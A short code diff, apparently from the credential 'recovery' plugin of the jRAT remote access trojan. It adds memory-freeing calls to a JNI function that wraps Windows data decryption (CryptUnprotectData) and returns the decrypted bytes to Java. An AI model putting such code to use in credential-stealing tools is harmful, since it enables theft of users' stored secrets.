@@ -15,5 +15,8 @@ JNIEXPORT jbyteArray JNICALL Java_jrat_plugin_recovery_stub_NativeUtils_cryptUnp
 	jbyteArray buff	= (*env)->NewByteArray(env, out.cbData);
 	(*env)->SetByteArrayRegion(env, buff, 0, out.cbData, out.pbData);
 
+	LocalFree(out.pbData);
+	LocalFree(in.pbData);
+
 	return buff;
 }
